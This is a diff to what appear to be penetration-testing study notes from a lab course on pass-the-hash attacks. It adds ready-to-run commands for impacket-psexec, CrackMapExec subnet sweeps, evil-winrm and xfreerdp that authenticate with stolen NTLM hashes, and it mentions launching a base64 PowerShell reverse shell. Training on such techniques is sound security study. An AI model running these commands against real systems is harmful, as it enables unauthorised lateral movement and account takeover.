@@ -30,3 +30,30 @@ Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Ha
 
 ## Idea !
 We can also use powershell reverse shell by base64, for that we just need to specify command after `-Command` flag
+
+# Pass the Hash with Impacket (Linux)
+
+**Pass the Hash with Impacket PsExec:**
+```bash
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/6a425769-4131-4201-9f4a-767c994a5dcf)
+
+**Pass the Hash with CrackMapExec (Linux):**
+```bash
+crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+## Tip !
+
+_If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local `SAM database` on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands._
+
+# Pass the Hash with evil-winrm (Linux)
+```bash
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
+
+# Pass the Hash using RDP
+```bash
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
